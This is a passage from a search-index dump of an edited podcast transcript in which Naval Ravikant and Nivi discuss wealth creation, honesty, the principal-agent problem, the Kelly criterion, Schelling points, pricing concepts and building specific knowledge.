head, one with the lies you tell \u2014and now have to keep track of\u2014and the other with the truth. If you are honest, you only have to think about one thing at a time, which frees up mental energy and makes you a clearer thinker. Also, by being honest you\u2019re rejecting people who only want to hear pretty lies. You force those people out of your network. Sometimes it\u2019s painful, especially with friends and family. But over the long-term you create room for the people who like you exactly the way that you are. That is a selfish reason to be honest. If you cut fair deals, you will get paid in the long run Negotiations offer another good example. If you\u2019re the kind of person who always tries to get the best deal for yourself, you will win a lot of early deals and it will feel very good. On the other hand, a few people will recognize that you\u2019re always scrabbling and not acting fairly, and they will tend to avoid you. Over time those are the people who end up being the dealmakers in the network. People go to them for a fair shake or to figure out what\u2019s fair. If you cut people fair deals, you won\u2019t get paid in the short-term. But over the long-term, everybody will want to deal with you. You end up being a market hub. You have more information. You have trust. You have a reputation. And people end up doing deals through you in the long-run. A lot of wisdom involves realizing long-term consequences of your actions. The longer your time horizon, the wiser you\u2019re going to seem to everybody around you. Envy Can Be Useful, or It Can Eat You Alive Envy can give you a powerful boost, or it can eat you alive Suffering through the wrong thing can motivate you to find the right thing Nivi: Do you want to tell us about jobs you had growing up and the one that kicked off your fanatical obsession with creating wealth? Naval: This gets a little personal, and I don\u2019t want to humble-brag. There was a thread going around Twitter\u2014 Name Five Jobs You\u2019ve Held \u2014and every rich person on there was signaling how they\u2019ve held normal jobs. I don\u2019t want to play that game. I\u2019ve had menial jobs. There are people who had it worse than me and people who had it better than me. At one point in college I was washing dishes in the school cafeteria and said, \u201cF this. I hate this. I can\u2019t do this anymore.\u201d I sweet-talked may way into a teaching assistant job for a computer science professor, even though I was completely unqualified. The job forced me to learn computer algorithms, so I could TA the rest of the course. So my desire to learn computer algorithms came out of the suffering I experienced washing dishes\u2014not that there\u2019s anything wrong with washing dishes; it just wasn\u2019t for me. I had an active mind. I wanted to make money and earn a living through mental activities, not through physical activities. Sometimes it takes suffering through the wrong thing to motivate you to find the right thing. Being a lawyer was not what I was meant to do Back in the day I had a prestigious internship at a big New York City law firm. I basically got fired for surfing Usenet . This was before the Internet was a big thing. Usenet hosted newsgroups, and it was the only the only thing keeping me from being completely bored. I was an overpaid intern wearing a suit and tie. I got to hang out in the conference room and make photocopies when lawyers needed them. I was bored out of my skull. This was pre-iPhone (thank God for Steve Jobs for saving us all from unending boredom). I used to read The Wall Street Journal or anything I could get my hands on. I would\u2019ve read the back of a brochure to keep from going insane, because listening to a bunch of corporate lawyers discuss how to optimize details of a contract is really dull. They wanted me to sit there quietly and not read the paper. They got mad and said, \u201cThat\u2019s rude. That\u2019s misbehavior.\u201d I got called up and reprimanded a bunch of times. I was finally terminated\u2014sent home in shame from my prestigious internship, destroying my chance to go to law school. I was unhappy\u2026 for all of an hour . Ultimately, it\u2019s one of the best things that ever happened to me. Otherwise, I would have ended up a lawyer. Not that I have anything against lawyers; it\u2019s just not what I was meant to do. Envy can be useful or it can eat you alive Nivi: You mentioned a catering job that kicked off your obsession with wealth. Naval: That was an envy thing. When I was in high school, I needed a job to pay for my first semester of college. It was the summer of 1990 or 1991. This was the Bush Senior recession\u2014if anyone listening was alive back then to remember it\u2014so it was actually really hard to get a job. I ended up working for a catering company serving Indian food. One day, I had to serve at a birthday party for a kid in my school. So I was out there serving food and drinks to all of my classmates. That was incredibly embarrassing. I wanted to hide away and die right there. But you know what? It\u2019s all part of the plan. It\u2019s all part of the motivation. If that didn\u2019t happen, I probably wouldn\u2019t be as motivated or as successful. It\u2019s all fine. It was definitely a strong motivator. In that sense, envy can be useful. Envy also can eat you alive if you let it follow you around your entire life. But there are points in your life when it can be a powerful booster rocket. Principal-Agent Problem: Act Like an Owner If you think and act like an owner, it\u2019s only a matter of time until you become an owner A principal is an owner; an agent is an employee Nivi: We spoke earlier about picking a business model that has leverage from scale economies, network effects and zero marginal cost of replication . There were a few other ideas on the cutting-room floor that I want to go through with you. The first one is the principal-agent problem . Naval: So mental models are all the rage. Everyone\u2019s trying to become smarter by adopting mental models. I think mental models are interesting, but I don\u2019t think explicitly in terms of mental-model checklists. I know Charlie Munger does, but that\u2019s just not how I think. Instead, I tend to focus on the few lessons I\u2019ve learned over and over in life that I think are incredibly important and seem to apply almost universally. One that keeps coming up from microeconomics\u2014because as we\u2019ve established, macroeconomics is not really worth spending time on\u2014is what\u2019s called the principal-agent problem. In this case it\u2019s a principal, who is a person; rather than a principle that you would follow. A principal is an owner. An agent works for the owner, so you can think of an agent as an employee. The difference between a founder and an employee is the difference between a principal and an agent. A principal\u2019s incentives are different than an agent\u2019s incentives I can summarize the principal-agent problem with a famous quote attributed to Napoleon or Julius Caesar: \u201cIf you want it done, Go. If not, Send.\u201d Which is to say: If you want to do something right, do it yourself; because other people just don\u2019t care enough. Now, the principal-agent problem pops up everywhere. In microeconomics, they try to characterize it this way: The principal\u2019s incentives are different than the agent\u2019s incentives, so the owner of the business wants what is best for the business and will make the most money. The agent generally wants whatever will look good to the principal, or might make them the most friends in the neighborhood or in the business, or might make them personally the most money. You see this a lot with hired-gun CEOs running public companies, where the ownership of the public company is distributed so widely that there\u2019s no principal remaining. Nobody owns more than 1% of the company. The CEO takes charge, stuffs the board with their buddies and then starts issuing themself low-price stock options, or doing a lot of stock buybacks because their compensation is based directly tied to the stock price. If you can work on incentives, don\u2019t work on anything else Agents have a way of hacking systems. This is what make incentive design so difficult. As Charlie Munger says, if you could be working on incentives, don\u2019t work on anything else . Almost all human behavior can be explained by incentives. The study of signaling is seeing what people do despite what they say. People are much more honest with their actions than they are with their words. You have to get the incentives right to get people to behave correctly. It\u2019s a very difficult problem because people aren\u2019t coin-operated. The good ones are not just looking for money\u2014they\u2019re also looking for things like status and meaning in what they do. As a business owner you are always going to be dealing with the principal-agent problem. You\u2019re always going to be trying to figure out: How do I make this person think like me? How do I incent them? How do I give them founder mentality? Only founders can fully appreciate the importance of a founder mentality and just how difficult and gnarly principal-agent problem is. When you do deals, it\u2019s better to have the same incentives If you are a principal, you want to spend a lot of your time thinking about this problem. You want to be generous with your top lieutenants\u2014in terms of ownership and incentives\u2014even if they don\u2019t necessarily realize it; because over time they will and you want them to be aligned with you. When you do business deals, it\u2019s better to have an aligned partnership where you both have the same incentives than a partnership where you have the advantage in the deal. Because eventually the other person will figure it and the partnership will fall apart. Either way, it\u2019s not going to be one of those things that you can invest in and enjoy the benefits of compound interest over decades. If you\u2019re an employee, your most important job is to think like a principal Finally, if you\u2019re in a role where you\u2019re an agent\u2014you\u2019re an employee\u2014then your most important job is to think like a principal. The more you can think like a principal, the better off you\u2019re going to be long-term. Train yourself how to think like a principal, and eventually you will become a principal. If you align yourself with a good principal, they will promote you or empower you or give you accountability or leverage that may be way out of proportion to your relatively menial role. I\u2019m always impressed by founders who promote young people through the ranks and allow them to skip multiple levels despite their lack of experience. Invariably it happens because this agent\u2014who\u2019s way deep down in the organization\u2014thinks like a principal. If you can hack your way through the principal-agent problem, you\u2019ll probably solve half of what it takes to run a company. Nivi: The reason I asked about this one first is because I feel like I never see the principal-agent problem in my work. I tend to work in small teams where everybody is highly economically aligned, and the people have been filtered for a commitment to the mission, and everybody else who doesn\u2019t work out moves on to another role elsewhere. Naval: These are all heuristics that you have designed to avoid having to deal with the single biggest problem in management. Deal with small firms to avoid the principal-agent problem Another example of a heuristic that helps you route around the principal-agent problem is to deal with the smallest firms possible. For example, when I hire a lawyer or a banker or even an accountant to work on my deals, I\u2019ve become very cognizant about the size of the firm. Bigger firms\u2014all other things being equal\u2014are generally worse than small ones. Yes, the big firm has more experience. Yes, they have more people. Yes, they have a bigger brand. But you\u2019ll find the principal and the agent are highly separated. Very often the principal will sell you and convince you to work with the firm, but then all the work will be done by an agent who simply doesn\u2019t care as much. You end up getting substandard service. I prefer to work with boutiques. My ideal law firm is a law firm of one. My ideal banker is a solo banker. Now, you\u2019re making other sacrifices and trade-offs in terms of that person\u2019s resources\u2014and you are betting big on that person. But you\u2019ve got one throat to choke. There\u2019s no one else to point fingers at; there\u2019s nowhere to run. The accountability is extremely high. If you are an agent, the best way to operate is to ask, \u201cWhat would the founder do?\u201d If you think like the owner and you act like the owner, it\u2019s only a matter of time until you become the owner. Kelly Criterion: Avoid Ruin Don\u2019t ruin your reputation or get wiped to zero Don\u2019t bet everything on one big gamble Nivi: Let\u2019s chat about the Kelly criterion. Naval: The Kelly criterion is a popularized mathematical formulation of a simple concept. The simple concept is: Don\u2019t risk everything. Stay out of jail. Don\u2019t bet everything on one big gamble. Be careful how much you bet each time, so you don\u2019t lose the whole kitty. If you\u2019re a gambler, the Kelly criterion mathematically formulates how much you should wager per hand, even if you have an edge\u2014because even when you have an edge, you can still lose. Let\u2019s say you have 51-to-49 edge. Every gambler knows not to bet the whole kitty on that 51-to-49 edge\u2014because you could lose everything and won\u2019t get to come back to the average. Nassim Taleb famously talks about ergodicity , which is a fancy word for a simple concept: What is true for 100 people on average isn\u2019t the same as one person averaging that same thing 100 times. Ruining your reputation is the same as getting wiped to zero The easiest way to see that is with Russian roulette . Say six people play Russian roulette one time each, and each winner gets $1 billion. One person ends up dead and five people get $1 billion. Compare that to one person playing Russian roulette six times with the same gun. They are never going to end up a billionaire\u2014they will be dead and worth zero. So risk-taking\u2014especially when the averages that are calculated across large populations\u2014is not always rational. The Kelly criterion helps you avoid ruin. The number one way people get ruined in modern business is not by betting too much; it\u2019s by cutting corners and doing unethical or downright illegal things. Ending up in an orange jumpsuit in prison or having a reputation ruined is the same as getting wiped to zero\u2014so never do those things. Schelling Point: Cooperating Without Communicating People who can\u2019t communicate can cooperate by anticipating the other person\u2019s actions Use social norms to cooperate when you can\u2019t communicate Nivi: Let\u2019s talk about Schelling points. Naval: The Schelling point is a game theory concept made famous by Thomas Schelling in his book, The Strategy of Conflict , which I recommend. It\u2019s about multiplayer games where people respond based on what they think the other person\u2019s response will be. He came up with a mathematical formalization to answer: How do you get people who cannot communicate with each other to coordinate? Suppose I want to meet with you, but I don\u2019t tell you where or when to meet. You also want to meet with me, but we can\u2019t communicate. That sounds like an impossible problem to solve\u2014we can\u2019t do it. But not quite. You can use social norms to converge on a Schelling point. I know you\u2019re rational and educated. And you know I\u2019m rational and educated. We\u2019re both going to start thinking. When will we meet? If we have to pick an arbitrary date, we\u2019ll probably pick New Year\u2019s Eve. What time will we meet? Midnight or 12:01 a.m. Where will we meet? If we\u2019re Americans, the big meeting spot is probably New York City, the most important city. Where in New York City will we meet? Probably under the clock at Grand Central Station. Maybe you end up at the Empire State Building, but not likely. You can find Schelling points in business, art and politics There are many games\u2014whether it\u2019s business or art or politics\u2014where you can find a Schelling point. So you can cooperate with the other person, even when you can\u2019t communicate. Here\u2019s a simple example: Suppose two companies are competing heavily and hold an oligopoly. Let\u2019s say the price fluctuates between $8 and $12 for whatever the service is. Don\u2019t be surprised if they converge on $10 without ever talking to each other. Turn Short-Term Games Into Long-Term Games Improve your leverage by turning short-term relationships into long-term ones Pareto optimal solutions require a trade-off to improve any criterion Nivi: Do you want to talk about Pareto optimal ? Naval: Pareto optimal is another concept from game theory, along with Pareto superior. Pareto superior means something is better in some ways while being equal or better in other ways. It\u2019s not worse in any way. This is an important concept when you\u2019re negotiating. If you can make a solution Pareto superior to where it was before, you will always do that. Pareto optimal is when the solution is the best it can possibly be and you can\u2019t change it without making it worse in at least one dimension. There is a hard trade-off from this point forward. These are important concepts to understand when you\u2019re involved in a big negotiation. Negotiations are won by whoever cares less I generally say, though: \u201c Negotiations are won by whoever cares less .\u201d Negotiation is about not wanting it too badly. If you want something too badly, the other person can extract more value from you. If someone is taking advantage of you in a negotiation, your best option is to turn it from a short-term game into a long-term game. Try to make it a repeat game. Try to bring reputation into the negotiation. Try to include other people who may want to play games with this person in the future. An example of a high-cost, low-information single-move game is having your house renovated. Contractors are notorious for overbooking, ripping people off, and being unaccountable. I\u2019m sure contractors have their own side to it: \u201cThe homeowner has unreasonable demands.\u201d \u201cWe found problems.\u201d \u201cThe homeowner doesn\u2019t want to pay for it.\u201d \u201cThey don\u2019t understand; they\u2019re low-information buyers.\u201d It\u2019s an expensive transaction. Historically it\u2019s been very hard to find good contractors; and the contractor has little information on the homeowner. Convert single-move games to multi-move games So you try to go through friends. You try to find people with good reputations. You\u2019re converting an expensive single-move game with a high probability of cheating on both sides into a multi-move game. One way to do that is to say: \u201cActually, I need two different projects done. The first project we\u2019ll do together, and based on that I\u2019ll decide if we do the second project.\u201d Another way is to say: \u201cI\u2019m going to do this project with you, and I have three friends who want projects done who are waiting to see the outcome of this project.\u201d Another way is to write a Yelp or Thumbtack review\u2014especially if the contractor operates within a community and wants to protect their reputation in that community. These are all ways to turn a single-move game into a longer term game and get past a position of poor negotiating leverage and poor information. Compounding Relationships Make Life Easier Life gets a lot easier when you know someone\u2019s got your back Mutual trust makes it easy to do business Relationships offer a good example of compound interest. Once you\u2019ve been in a good relationship with somebody for a while\u2014whether it\u2019s business or romantic\u2014life gets a lot easier because you know that person\u2019s got your back. You don\u2019t have to keep questioning. If I\u2019m doing a deal with someone I\u2019ve worked with for 20 years and there is mutual trust, we don\u2019t have to read the legal contracts. Maybe we don\u2019t even need to create legal contracts; maybe we can do it with a handshake. That kind of trust makes it very easy to do business. If Nivi and I start another company and things aren\u2019t working out, I know we\u2019re both going to be extremely reasonable about deciding what to do\u2014how to exit or shut it down. Or if we\u2019re scaling it, how to bring in new people. We have mutual trust, and that allows us to start businesses more easily and compounds the effect. The most under-recognized reason startups fail is because the founders fall apart. A startup is so difficult to pull off, so removing potential friction points between founders can be the difference between success and failure. It\u2019s better to have a few compounding relationships than many shallow ones Nivi: There are a couple of non-intuitive things about compounding. The first is that most of the benefits come at the end, so you may not see huge benefits up front. Sam Altman wrote, \u201c I always want it to be a project that, if successful, will make the rest of my career look like a footnote .\u201d Again, most of the benefits of compounding come at the end. Another thing that\u2019s non-intuitive about compounding: It\u2019s better to have a few deep compounding relationships than many shallow, non-compounding relationships. It takes just as much effort to create a small business as a large one Naval: One thing about business that people don\u2019t realize: it takes just as much effort to create a small business as it does to create a large one. Whether you\u2019re Elon Musk or the guy running three Italian restaurants in town, you\u2019re working 80 hours a week; you\u2019re sweating bullets; you\u2019re hiring and firing people; you\u2019re trying to balance the books; it\u2019s highly stressful; and it takes years and years of your life. In one case, you get companies worth $50-$100 billion and everyone\u2019s adulation. In the other, you might make a little bit of money and you\u2019ve got some nice restaurants. So think big. Price Discrimination: Charge Some People More You can charge people for extras based on their propensity to pay Price discrimination is a technique for charging certain people more Nivi: Are there any other microeconomic concepts, outside of zero marginal cost of replication and scale economies , that are important to understand? Naval: Price discrimination is important. It means you can charge people based on their propensity to pay. Now, you can\u2019t charge people different amounts just because you don\u2019t like them. You have to offer them something extra. But it has to be something rich people care about. Business-class seats routinely cost five or 10 times more than economy seats. But it costs the airline much less\u2014maybe two or three times more than a standard seat\u2014to provide perks like wider seats, more legroom and free drinks. Rich people and large enterprises are willing to pay more Price discrimination works because rich people are willing to pay more. You just have to give them the extra little things they need to signal they\u2019re rich or that little bit of comfort they want. A lot of enterprise software companies use price discrimination, especially with freemium products. The free or low-price version will do almost everything you want. But if you want the version that\u2019s extra secure or hosted on your site or has multiple-user administration so the IT person can monitor everything, you\u2019ll find yourself paying 10 or 100 times more. Consumer Surplus: Getting More Than You Paid For People are willing to pay more than what companies charge Consumer surplus is the extra value you get when you pay less than you were willing Naval: Consumer surplus and producer surplus are important concepts. Consumer surplus is the excess value you get from something when you pay less than you were willing to pay. I get a lot of joy out of my morning Starbucks coffee. Obviously I\u2019ve made some money. So if my coffee cost $20, I would pay it. But Starbucks doesn\u2019t know that. They can\u2019t price the coffee at $20 just for me, because they\u2019re selling the exact same product to others. So I\u2019m getting a lot of consumer surplus out of the coffee. All businesses generate consumer surplus. It\u2019s a good thing to keep in mind when someone\u2019s harping on about how evil companies are. Amazon might be a trillion-dollar company, but I\u2019ll bet they\u2019re generating trillions of dollars in consumer surplus through people\u2019s willingness to pay for convenience. A lot of people are willing to pay more than what Amazon charges. Net Present Value: What Future Income Is Worth Today See what future income is worth today by applying a discount to its future value Figure out what future income is worth today by applying a discount rate Nivi: Let\u2019s talk about net present value (NPV). Naval: Net present value is when you say, \u201cThat stream of payments I\u2019m going to get in the future\u2014what\u2019s it worth today?\u201d Here\u2019s a common example: You\u2019re joining a startup and getting stock options, and the founder says, \u201cThis company is going to be worth $1 billion, and I\u2019m giving you 0.1% of the company; therefore, you\u2019re getting $1 million worth of stock.\u201d The founder is negotiating based on what it\u2019s going to be worth in the future. You have to figure out what it\u2019s worth today by applying a discount rate, or an interest rate, that accounts for the massive risk startups face. You\u2019ll end up with the amount the company is actually worth today. That\u2019s the price at which a venture capitalist would invest in the company. If the founder recently raised a round at a $10 million valuation, then the company\u2019s only worth 1% of what the founder says it will be worth. So your $1 million package is actually worth $10,000. You should get very comfortable doing rough net present value calculations in your head. Externalities: Calculating the Hidden Costs of Products Externalities let you account for the true cost of products by including hidden costs Nivi: What\u2019s a mispriced externality ? You mentioned it on a previous episode . Naval : An externality is where there\u2019s an additional cost imposed by whatever product is being produced or consumed, that\u2019s not accounted for in the price of the product. This can happen for many reasons. Sometimes you can fix it by putting the cost back into the price. Some of the most ardent critics of capitalism argue it\u2019s destroying the environment. If you throw away capitalism because it\u2019s destroying the environment, then guess what\u2014we\u2019re all headed back to pre-industrial times. That\u2019s not going to be a good thing. Pricing externalities properly is more effective than feel-good measures Because the environment is finite and precious, we have to price it properly and fold that back into the cost of products and services. If people are wasting water, releasing hydrocarbons into the atmosphere or polluting in other ways, society should charge them what it costs to clean up the pollution and return the environment to a pristine state. Perhaps that price has to be very, very, very high. If you raise the price high enough, you\u2019ll knock out pollution. That\u2019s much better than feel-good measures like banning plastic bags or restricting showers during a drought. Properly pricing externalities can save resources in a tremendous way California likes to run declarations and ads to scare people into avoiding showers during droughts. It would be better to raise the price of fresh water. The average consumer might pay a few pennies more for a shower, but the almond farmers\u2014who consume a lot of water\u2014will cut back; and almond farming may move to a part of the country where water is more abundant. Properly pricing externalities can save resources in a tremendous way. It\u2019s a good framework to use when you want to do things like save the environment, rather than doing feel-good things that won\u2019t actually amount to anything. Bonus: Finding Time to Invest in Yourself If you have to work a \u201cnormal job,\u201d take on accountability to build your specific knowledge Nivi: A common question we get: \u201cHow do I find the time to start investing in myself? I have a job.\u201d You have to rent your time to get started In one of the tweets from the cutting room floor, you wrote: \u201cYou will need to rent your time to get started. This is only acceptable when you are learning and saving. Preferably in a business where society does not yet know how to train people and apprenticeship is the only model.\u201d Naval: Try to learn something that people haven\u2019t quite figured out how to teach yet. That can happen if you\u2019re working in a new and quickly expanding field. It\u2019s also common in fields that are circumstantial\u2014where the details matter and it\u2019s always moving. Investing is one of those fields; so is entrepreneurship. Chief of staff for a founder is one of the most coveted jobs for young people starting out in Silicon Valley. The brightest kids will follow an entrepreneur around and do whatever he or she needs them to do. In many cases, the person is way overqualified. Someone with multiple graduate degrees might be running the CEO\u2019s laundry because that\u2019s the most important thing at the moment. At the same time, that person gets to attend the most important meetings. They are privy to all the stress and theatrics, the fundraising decks and the innovation\u2014knowledge that can only come from being in the room. Coming out of college, Warren Buffett wanted to work for Benjamin Graham to learn to be a value investor. Buffett offered to work for free, and Graham responded, \u201cYou\u2019re overpriced.\u201d What that means is you have to make sacrifices to take on an apprenticeship. Find the part of the job with the steepest learning curve If can\u2019t learn in an apprenticeship model because you need to make money, try to be innovative in the context of your job. Take on new challenges and responsibilities. Find the part of the job with the steepest learning curve. You want to avoid repetitive drudgery\u2014that\u2019s just biding time until your job is automated away. If you\u2019re a barista at the coffee shop, figure out how to make connections with the customers. Figure out how to innovate the service you offer and delight the customer. Managers, founders and owners will take notice. Develop a founder mentality The hardest thing for any founder is finding employees with a founder mentality. This is a fancy way of saying they care enough. People will say, \u201cWell, I\u2019m not the founder. I\u2019m not being paid enough to care.\u201d Actually, you are: The knowledge and skills you gain by developing a founder mentality set you up to be a founder down the line; that\u2019s your compensation. You can get a lot out of almost any position. You just have to put a lot into it. Accountability is something you can take on immediately Nivi: We\u2019ve discussed accountability, judgment, specific knowledge and leverage. If I\u2019m working a \u201cnormal\u201d job, is specific knowledge the one I should focus on? Naval: Judgment takes experience. It takes a lot of time to build up. You have to put yourself in positions where you can exercise judgment. That\u2019ll come from taking on accountability. Leverage is something that society gives you after you\u2019ve demonstrated judgment. You can get it faster by learning high-leverage skills like coding or working with the media. These are permissionless leverage. This is why I encourage people to learn to code or produce media, even if it\u2019s just nights and weekends. So, judgment and leverage tend to come later. Accountability is something you can take on immediately. You can say, \u201cHey, I\u2019ll take charge of this thing that nobody wants to take charge of.\u201d When you take on accountability, you\u2019re also publicly putting your neck on the chopping block\u2014so you have to deliver. You build specific knowledge by taking accountability for things that other people don\u2019t know how to do. Perhaps they\u2019re things you enjoy doing or are naturally inclined towards doing anyway. If you work in a factory, the hardest thing may be raising capital to keep the factory running. Maybe that\u2019s what the owner is always stressed out about. You might notice this and think, \u201cI\u2019m good at balancing my checkbook and have a good head for numbers; but I haven\u2019t raised money before.\u201d You offer to help and become the owner\u2019s sidekick solving their fundraising problem. If you have a natural aptitude and take on accountability, you can put yourself in a position to learn quickly. Before long, you\u2019ll become the heir apparent. Early on, find things that interest you and allow you to take on accountability. Don\u2019t worry about short-term compensation. Compensation comes when you\u2019re tired of waiting for it and have given up on it. This is the way the whole system works. If you take on accountability and solve problems on the edge of knowledge that others can\u2019t solve, people will line up behind you. The leverage will come. Specific knowledge can be timely or timeless There are two forms of specific knowledge: timely and timeless . If you become a world-class expert in machine learning just as it takes off and you got there through genuine intellectual interest, you\u2019re going to do really well. But 20 years from now, machine learning may be second hat; the world may have moved on to something else. That\u2019s timely knowledge. If you\u2019re good at persuading people, it\u2019s probably a skill you picked up early on in life. It\u2019s always going to apply, because persuading people is always going to be valuable. That\u2019s timeless knowledge. Now, persuasion is a generic skill\u2014it\u2019s probably not enough to build a career on. You need to combine it in a skill stack, as Scott Adams writes . You might combine persuasion with accounting and an understanding of semiconductor production lines. Now you can become the best semiconductor salesperson and, later on, the best semiconductor company CEO. Timeless specific knowledge usually can\u2019t be taught, and it sticks with you forever. Timely specific knowledge comes and goes; but it tends to have a fairly long shelf life. Technology is a good place to find those timely skills sets. If you can bring in a more generic specialized knowledge skill set from the outside, then you\u2019ve got gold. Technology is an intellectual frontier for gaining specific knowledge Nivi: There were a couple other tweets from the cutting-room floor on this topic. The first: \u201cThe technology industry is a great place to acquire specific knowledge. The frontier is always moving forward. If you are genuinely intellectually curious, you will acquire the knowledge ahead of others.\u201d Naval: Danny Hillis famously said technology is everything that doesn\u2019t work yet . Technology is around us everywhere. The spoon was technology once; fire was technology once. When we figured out how to make them work, they disappeared in the background and became part of our everyday lives. Technology is, by definition, the intellectual frontier. It\u2019s taking things from science and culture that we have not figured out how to mass produce or create efficiently and figuring out how to commercialize it and make it available to everybody. Technology will always be a great field where you can pick up specific knowledge that is valuable to society. If you don\u2019t have accountability, do something different Nivi: Here\u2019s another tweet from the cutting-room floor related to accountability: \u201cCompanies don\u2019t know how to measure outputs, so they measure inputs instead. Work in a way that your outputs are visible and measurable. If you don\u2019t have accountability, do something different.\u201d Naval: The entire structure of rewarding people comes from the agricultural and industrial ages, when inputs and outputs matched up closely. The amount of hours you put into doing something was a reliable proxy for what kind of output you\u2019d get. Today, it\u2019s extremely nonlinear. One good investment decision can make a company $10 million or $100 million. One good product feature can be the difference between product-market fit and complete failure. As a result, judgment and accountability matter much more. Often the best engineers aren\u2019t the hardest workers. Sometimes they don\u2019t work very hard at all, but they dependably ship that one critical product at just the right time. It\u2019s similar to the salesperson who closes the huge deal that makes the company\u2019s numbers for the quarter. People need to be able to tell what role you had in the company\u2019s success. That doesn\u2019t mean stomping all over your team\u2014people are extremely sensitive to others taking too much credit. You always want to be giving out credit. Smart people will know who was responsible. Some jobs are too removed from the customer for this type of accountability. You\u2019re just a cog in a machine. Consulting is a good example. As a consultant, your ideas are delivered through someone else within the organization. You may not have visibility to the top people; you may be hidden behind a screen. That\u2019s a trade-off you\u2019re making in exchange for your independence. You\u2019ll develop thick-skin if you take on accountability When you have accountability, you get a lot more credit when things go right. Of course, the downside is you get hurt a lot more when things go wrong. When you stick your neck out, you have to be willing to be blamed, sacrificed and even attacked. If you\u2019re the kind of person who thrives in a high-accountability environment, you\u2019re going to end up thick-skinned over time. You\u2019re going to get hurt a lot. People are going to attack you if you fail. Scale your specific knowledge with apprentices Nivi: Once you get some specific knowledge, you can scale it by training your own apprentices and outsourcing tasks to them. Naval: For example, I made good investments and figured out the venture business. I could have kept doing that and making money. Instead, I co-founded Spearhead to train up-and-coming founders to become angels and venture investors. We give them a checkbook to start investing. It\u2019s an apprenticeship model. They come to us with deals they\u2019re looking at, and we help them think it through. This model is more scalable than my personal investing. Specific knowledge comes on the job, not in a classroom At Spearhead we lead classes teaching founders about investing, and we also hold office hours to discuss specific deals they bring. It turns out the classes and talks we lead are largely worthless. You can give all the generic advice people need in about an hour. After that, the advice gets so circumstantial that it essentially cancels to zero. But the office hours are incredibly useful. This reinforces the notion that investing is one of those skills that can only be learned on the job. When you find a skill like that, you\u2019re dealing with specific knowledge. Another good indicator of specific knowledge is when someone can\u2019t give a straight answer to the question: \u201cWhat do you do every day?\u201d Or you get an answer along the lines of, \u201cEvery day is different based on what\u2019s going on.\u201d The thing is so complicated and dependent upon circumstances that it can\u2019t be boiled down into a textbook form. Nivi: The mafia figured out this apprenticeship model a long time ago. The best way to end up running one of the families was to become the driver for the Don. Naval: Tony Soprano was a businessman who had to enforce his own contracts. That\u2019s a very complicated business. This transcript has been edited for clarity. \u539f\u6587\u94fe\u63a5\uff1a https://nav.al/rich","title":"How to Get Rich"},{"location":"other/How%20to%20Get%20Rich/#seek-wealth-not-money-or-status","text":"Wealth is assets that earn while you sleep Naval is a prolific tech investor and founder of AngelList Nivi: You probably know Naval from his Twitter account. We\u2019re going to talk about his tweetstorm, \u201c How To Get Rich (without getting lucky) .\u201d We\u2019ll go through most of the tweets in detail, give Naval a chance to expand on them and generally riff on the topic. He\u2019ll probably throw in ideas he hasn\u2019t published before. Naval\u2019s the co-founder of AngelList and Epinions. He\u2019s also a prolific tech investor in companies like Twitter, Uber and many more. I\u2019m the co-founder of AngelList with Naval. And I co-authored the Venture Hacks blog with him back in the day. Naval: The \u201cHow to Get Rich\u201d tweetstorm definitely hit a nerve and went viral. A lot of people say it was helpful and reached across aisles. People outside of the tech industry\u2014people in all walks of life\u2014want to know how to solve their money problems. Everyone vaguely knows they want to be wealthy, but they don\u2019t have a good set of principles to do it by. Wealth is assets that earn while you sleep Nivi: What\u2019s the difference between wealth, money and status? Naval: Wealth is the thing you want. Wealth is assets that earn while you sleep; it\u2019s the factory of robots cranking out things. Wealth is the computer program running at night that\u2019s serving other customers. Wealth is money in the bank that is reinvested into other assets and businesses. A house can be a form of wealth, because you can rent it out; although that\u2019s a less productive use of land than running a commercial enterprise. My definition of wealth is oriented toward businesses and assets that can earn while you sleep. Wealth buys your freedom You want wealth because it buys you freedom\u2014so you don\u2019t have to wear a tie like a collar around your neck; so you don\u2019t have to wake up at 7:00 a.m. to rush to work and sit in commute traffic; so you don\u2019t have to waste your life grinding productive hours away into a soulless job that doesn\u2019t fulfill you. The purpose of wealth is freedom; it\u2019s nothing more than that. It\u2019s not to buy fur coats, or to drive Ferraris, or to sail yachts, or to jet around the world in a Gulf Stream. That stuff gets really boring and stupid, really fast. It\u2019s about being your own sovereign individual. You\u2019re not going to get that unless you really want it. The entire world wants it, and the entire world is working hard at it. It is competitive to some extent. It\u2019s a positive sum game\u2014but there are competitive elements to it, because there\u2019s a finite amount of resources right now in society. To get the resources to do what you want, you have to stand out. Money is how we transfer wealth Money is how we transfer wealth. Money is social credits; it\u2019s the ability to have credits and debits of other people\u2019s time. If I do my job right and create value for society, society says, \u201cOh, thank you. We owe you something in the future for the work that you did. Here\u2019s a little IOU. Let\u2019s call that money.\u201d That money gets debased because people steal the IOUs; the government prints extra IOUs; and people renege on their IOUs. But money tries to be a reliable IOU from society that you are owed something for something you did in the past. We transfer these IOUs around; money is how we transfer wealth. Status is your rank in the social hierarchy There are fundamentally two huge games in life that people play. One is the money game. Money is not going to solve all of your problems; but it\u2019s going to solve all of your money problems. I think people know that. They realize that, so they want to make money. At the same time, deep down many people believe they can\u2019t make it; so they don\u2019t want any wealth creation to happen. They virtue signal by attacking the whole enterprise, saying, \u201cWell, making money is evil. You shouldn\u2019t do it.\u201d But they\u2019re actually playing the other game, which is the status game. They\u2019re trying to be high status in the eyes of others by saying, \u201cWell, I don\u2019t need money. We don\u2019t want money.\u201d Status is your ranking in the social hierarchy. Wealth is not a zero-sum game. Everybody in the world can have a house. Because you have a house doesn\u2019t take away from my ability to have a house. If anything, the more houses that are built, the easier it becomes to build houses, the more we know about building houses, and the more people can have houses. Wealth is a very positive-sum game. We create things together. We\u2019re starting this endeavor to create a piece of art that explains what we\u2019re doing. At the end of it, something brand new will be created. It\u2019s a positive-sum game. Status is a very old game Status, on the other hand, is a zero-sum game. It\u2019s a very old game. We\u2019ve been playing it since monkey tribes. It\u2019s hierarchical. Who\u2019s number one? Who\u2019s number two? Who\u2019s number three? And for number three to move to number two, number two has to move out of that slot. So, status is a zero-sum game. Politics is an example of a status game. Even sports is an example of a status game. To be the winner, there must be a loser. Fundamentally, I don\u2019t like status games. They play an important role in our society, so we can figure out who\u2019s in charge. But you play them because they\u2019re a necessary evil. On an evolutionary basis\u2014if you go back thousands of years\u2014status is a much better predictor of survival than wealth. You couldn\u2019t have wealth before the farming age because you couldn\u2019t store things. Hunter-gatherers carried everything on their backs. Hunter-gatherers lived in entirely status-based societies. Farmers started going to wealth-based societies. The modern industrial economies are much more heavily wealth-based societies. People creating wealth will always be attacked by people playing status games There\u2019s always a subtle competition going on between status and 